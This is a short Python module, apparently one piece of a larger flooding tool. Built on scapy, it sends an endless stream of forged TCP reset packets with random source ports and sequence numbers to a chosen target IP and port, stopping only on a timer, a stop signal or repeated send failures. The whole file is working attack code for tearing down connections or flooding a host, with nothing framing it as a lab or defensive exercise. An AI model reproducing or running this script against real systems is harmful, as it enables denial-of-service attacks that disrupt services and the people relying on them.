from scapy.all import IP, TCP, send
import random
import time

def launch(target_ip, port, duration, tag, stop_event, fail_tracker):
    start_time = time.time()
    failed = 0

    while not stop_event.is_set():
        if duration and time.time() - start_time > duration:
            break
        try:
            ip_layer = IP(dst=target_ip)
            tcp_layer = TCP(
                sport=random.randint(1024, 65535),
                dport=port,
                flags="R",
                seq=random.randint(0, 4294967295)
            )
            send(ip_layer / tcp_layer, verbose=0)  # optionally add iface="eth0"
        except StopIteration:
            print(f"[!] Cannot find route/interface to send packets to {target_ip}.")
            fail_tracker[tag] = True
            break
        except Exception:
            failed += 1
            if failed > 20:
                fail_tracker[tag] = True
                break

        time.sleep(0.01)
